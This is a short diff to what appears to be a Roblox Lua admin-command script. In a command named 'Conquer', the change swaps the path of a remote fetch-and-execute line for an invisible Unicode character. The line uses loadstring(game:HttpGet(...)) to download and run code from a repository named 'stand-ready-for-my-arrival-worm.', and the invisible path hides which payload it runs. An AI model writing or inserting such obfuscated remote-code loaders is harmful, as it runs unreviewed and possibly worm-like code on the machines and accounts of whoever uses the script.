@@ -6782,7 +6782,7 @@ task.spawn(function()
 
 	addcmd('Conquer',{},function(args, speaker)
 		notify('THE EMPIRE NEEDS YOU.')
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/d00xy4b14n/stand-ready-for-my-arrival-worm./refs/heads/main/FE"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/d00xy4b14n/stand-ready-for-my-arrival-worm./refs/heads/main/%E2%81%AD"))()
 	end)
 
 	addcmd('removealias',{},function(args, speaker)
